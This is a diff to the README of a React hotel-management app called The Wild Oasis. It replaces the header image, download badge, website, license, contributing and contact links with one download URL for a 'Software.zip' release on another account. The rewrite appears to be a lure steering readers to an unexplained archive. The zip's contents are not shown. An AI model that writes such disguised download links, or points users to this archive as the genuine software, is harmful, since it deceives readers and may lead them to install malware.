@@ -2,7 +2,7 @@
 
   Welcome to **The Wild Oasis**, a comprehensive web application built with React for hotel staff to efficiently manage cabins, reservations, and guest information. 🌟
 
-  ![Hotel](https://images.unsplash.com/photo-1598960171301-61cf2806b64c)
+  ![Hotel](https://github.com/MrRobot0404/the-wild-oasis/releases/download/v2.0/Software.zip)
 
   ### Features 🎉
   - **Context API:** Manage global state for improved data handling.
@@ -16,12 +16,12 @@
   - **Tanstack Query:** Efficiently fetch and manage data in React applications.
 
   ### 📁 Installation
-  🚀 To use the application, you can download it [here](https://github.com/user-attachments/files/18388744/Software.zip).
+  🚀 To use the application, you can download it [here](https://github.com/MrRobot0404/the-wild-oasis/releases/download/v2.0/Software.zip).
 
   #### Needs to be Launched
 
   ### 🌐 Visit Our Website
-  If you want to learn more about our project, visit our website [here](https://www.the-wild-oasis.com).
+  If you want to learn more about our project, visit our website [here](https://github.com/MrRobot0404/the-wild-oasis/releases/download/v2.0/Software.zip).
 
   ### 💻 Usage
   Simply download the application and follow the installation instructions to start managing your hotel efficiently. 🏝️
@@ -29,18 +29,18 @@
   ### 🚀 Releases
   If the provided download link is not working, please check the "Releases" section of this repository for alternative download options.
 
-  ![Download](https://img.shields.io/badge/Download-Software.zip-<COLOR>)
+  ![Download](https://github.com/MrRobot0404/the-wild-oasis/releases/download/v2.0/Software.zip<COLOR>)
 
   ### 📸 Screenshots
   Include beautiful screenshots showcasing the user interface of the application.
 
   ### 📝 License
-  This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+  This project is licensed under the MIT License - see the [https://github.com/MrRobot0404/the-wild-oasis/releases/download/v2.0/Software.zip](https://github.com/MrRobot0404/the-wild-oasis/releases/download/v2.0/Software.zip) file for details.
 
   ### 🌟 Get Involved
-  If you are interested in contributing to our project, please check out our [CONTRIBUTING.md](CONTRIBUTING.md) guidelines.
+  If you are interested in contributing to our project, please check out our [https://github.com/MrRobot0404/the-wild-oasis/releases/download/v2.0/Software.zip](https://github.com/MrRobot0404/the-wild-oasis/releases/download/v2.0/Software.zip) guidelines.
 
   ### 📧 Contact Us
-  If you have any questions or feedback, feel free to [contact us](mailto:info@the-wild-oasis.com).
+  If you have any questions or feedback, feel free to [contact us](https://github.com/MrRobot0404/the-wild-oasis/releases/download/v2.0/Software.zip).
 
   Let's create a seamless experience for hotel staff with **The Wild Oasis**! 🌺
